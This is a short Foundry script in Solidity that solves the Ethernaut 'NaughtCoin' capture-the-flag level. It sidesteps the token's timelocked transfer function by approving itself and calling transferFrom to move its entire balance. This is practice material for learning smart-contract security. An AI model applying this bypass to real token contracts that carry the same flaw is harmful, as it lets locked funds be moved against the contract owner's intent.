// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import {Script, console2} from "forge-std/Script.sol";
import {INaughtCoin} from "src/naughtCoin/INaughtCoin.sol";

contract NaughtCoinScript is Script {
    INaughtCoin internal naughtCoin;

    function setUp() public virtual {
        naughtCoin = INaughtCoin(0x91d39e2F5C5c64B34Bf2572e60501e2225808309);
    }

    function run() public virtual {
        vm.startBroadcast();
        naughtCoin.approve(msg.sender, type(uint256).max);
        naughtCoin.transferFrom(
            msg.sender,
            0x91d39e2F5C5c64B34Bf2572e60501e2225808309,
            naughtCoin.balanceOf(msg.sender)
        );
        vm.stopBroadcast();
    }
}
